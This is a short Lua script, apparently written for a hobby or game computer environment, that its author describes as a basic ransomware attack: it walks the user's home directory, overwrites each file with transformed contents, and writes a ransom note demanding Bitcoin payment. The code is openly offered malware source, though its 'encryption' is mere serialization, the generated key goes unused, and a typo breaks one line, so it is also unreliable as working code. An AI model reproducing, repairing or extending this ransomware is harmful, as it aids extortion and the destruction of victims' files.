--The program I made is a very basic ransomware attack. It starts by generating a key and then saving it in the victim's home directory. It then goes through every file in the home directory (excluding the .keys directory) and encrypts each one using the key. Finally, it creates a ransom note and saves it in the home directory.
--dont run obviously
--linux only for now,
--lazy

local fs = require("filesystem")
local ser = require("serialization")
local shell = require("shell")

-- Functions

function encrypt_file(path)
  local data = fs.read(path)
  localencrypted_data = ser.serialize(data)
  fs.write(path, encrypted_data)
end

function decrypt_file(path)
  local data = fs.read(path)
  local decrypted_data = ser.unserialize(data)
  fs.write(path, decrypted_data)
end

function generate_key()
  local key = ""
  for i = 1, 16 do
    key = key .. string.format("%x", math.random(0, 15))
  end
  return key
end

function save_key(key)
  fs.makeDirectory("/home/.keys")
  fs.write("/home/.keys/key.txt", key)
end

function load_key()
  return fs.read("/home/.keys/key.txt")
end

function get_victim_name()
  return os.getenv("USER")
end

-- Main program

local key = generate_key()
save_key(key)

local victim = get_victim_name()
local home_path = "/home/" .. victim

for file in fs.list(home_path) do
  if file ~= ".keys" then
    local path = home_path .. "/" .. file
    encrypt_file(path)
  end
end

local ransom_note = [[
Hello, victim. Your files have been encrypted!

To decrypt your files, you must pay a ransom of $100.

To pay the ransom, send the amount to the following Bitcoin address:

1H5tD4Yh3N5j7y8A9s0dF1g2e3j4k5l6m

Once the ransom has been paid, your files will be decrypted and you can access them again.

Thank you for your cooperation!
]]

fs.write(home_path .. "/README.txt", ransom_note)